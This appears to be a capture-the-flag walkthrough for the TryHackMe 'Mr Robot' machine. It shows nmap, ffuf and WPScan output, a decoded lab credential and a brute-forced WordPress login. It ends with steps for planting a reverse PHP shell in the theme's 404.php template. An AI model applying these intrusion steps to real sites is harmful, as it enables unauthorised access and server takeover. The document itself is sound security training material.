---
sidebar_position: 1
title: MrRobot
sidebar_label: Enumeration
description: Can you root this Mr. Robot styled machine?
keywords: [mrrobot, mr robot, tryhackme, ctf, pentesting, guide, docs, tutorial, enumeration, exploitation, nmap, ffuf, ftp, privilege escalation]
---


:::note Box Description

Can you root this Mr. Robot styled machine?

:::


## NMAP

- <b style={{ color: 'Coral' }}>[SSH: 22 CLOSED/FILTERED]</b> <b style={{ color: 'LightSkyBlue' }}>[HTTP: 80]</b> <b style={{ color: 'LightSkyBlue' }}>[HTTPS: 443]</b>

```log
Nmap scan report for 10.10.189.35
Host is up (0.093s latency).

PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache
443/tcp open   ssl/http Apache httpd
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache
```

## FFUF


- <b><b style={{ color: 'PowderBlue' }}>WordPress</b> User Blog:</b> <b style={{ color: 'SandyBrown' }}>[IP:80/0]</b> 
- <b><b style={{ color: 'PowderBlue' }}>WordPress</b> Login Portal:</b> <b style={{ color: 'SandyBrown' }}>[IP:80/wp-content]</b> 
- The File `Robots.txt` is Exposed: <b style={{ color: 'SandyBrown' }}>[IP:80/robots]</b> 

```log
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.189.35/FUZZ
 :: Wordlist         : FUZZ: Dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________
...
0                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 334ms]
wp-content              [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 505ms]
readme                  [Status: 200, Size: 64, Words: 14, Lines: 2, Duration: 145ms]
robots                  [Status: 200, Size: 41, Words: 2, Lines: 4, Duration: 468ms]
...
```

<br/>

- The File `license.txt` contains **WordPress Credentials** Encoded in `BASE64`: <b style={{ color: 'SandyBrown' }}>[IP:80/license.txt]</b>

```log
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.189.35/FUZZ
 :: Wordlist         : FUZZ: Seclists/Discovery/Web-Content/QuickHits.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response status: 301,403
________________________________________________
...
/license.txt            [Status: 200, Size: 309, Words: 25, Lines: 157, Duration: 120ms]
...
```

<br/>

---
## Content Discovery

- <b style={{ color: 'SandyBrown' }}>[IP:80/robots.txt]</b>
- The File `fsocity.dic` is a WordList of Possible **Usernames - Passwords**

```html
User-agent: *
fsocity.dic
```

- <b style={{ color: 'SandyBrown' }}>[IP:80/license.txt]</b>
- The Text is `BASE64` Encoded. After **Decoding** the Text we can use those Credentials to Login into <b style={{ color: 'PowderBlue' }}>WordPress</b> <b>Admin Panel</b>.

```log {4}
What you do just pull code from Rapid9 or some s@#% since when did you become a script kitty?
Do you want a password or something?

ZWxsaW90OkVSMjgtMDY1Mgo=
```

```log
┌──────────────────────────┐    ┌──────────────────┐
| ZWxsaW90OkVSMjgtMDY1Mgo= | -► | elliot:ER28-0652 |
└──────────────────────────┘    └──────────────────┘
```

---

<br/>


## WPScan


- <b style={{ color: 'PowderBlue' }}>WordPress</b> <span style={{fontWeight: 'Bold'}}>Version:</span> <b style={{ color: 'Plum' }}>4.3.1</b>
- **`XML-RPC` Enabled:** `An Attacker can abuse this Interface to Brute-Force Authentication`

```log {4,14}
[+] URL: http://10.10.189.35/ [10.10.189.35]
[+] Started: Thu Nov  3 11:28:06 2022

[+] XML-RPC seems to be enabled: http://10.10.189.35/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress version 4.3.1 identified (Insecure, released on 2015-09-15).
 | Found By: Rss Generator (Aggressive Detection)
 |  - http://10.10.189.35/feed/, <generator>http://wordpress.org/?v=4.3.1</generator>
 |  - http://10.10.189.35/comments/feed/, <generator>http://wordpress.org/?v=4.3.1</generator>
```

<br/>

- Since the Machine is Based on `Mr Robot` Theme, we can Assume that the Username is <b style={{ color: 'Chartreuse' }}>Elliot</b>. Therefore we only need to <b>Brute-Force</b> the <b>Password</b> with the Dictionary `fsocity.dic` that we found in **`robots.txt`.**
- These are the same **Credentials** that we found during our Enumeration in **`license.txt`.**

```log {2}
[+] Performing password attack on Xmlrpc Multicall against 1 user/s
[SUCCESS] - elliot / ER28-0652
```

<br/>

---

## WordPress Exploitation

- **Using** <b style={{ color: 'PowderBlue' }}>WordPress</b> <span style={{fontWeight: 'Bold'}}>Credentials to Login:</span> <b style={{ color: 'Chartreuse' }}>elliot</b><b style={{ color: 'Grey' }}>:</b><b style={{ color: 'Coral' }}>ER28-0652</b>

![MR](/img/vmlinux/mrrobot-wordpress-2.png)



- **Replacing `404.php` with a ** <b style={{ color: 'Plum' }}>Reverse PHP Shell</b>
- `WordPress -> Appearance -> Theme Editor -> 404 Template (404.php)` 
- **Reverse Shell Execution Location:** `http://IP/blog/wp-content/themes/twentyseventeen/404.php`

![MR](/img/vmlinux/mrrobot-wordpress-3.png)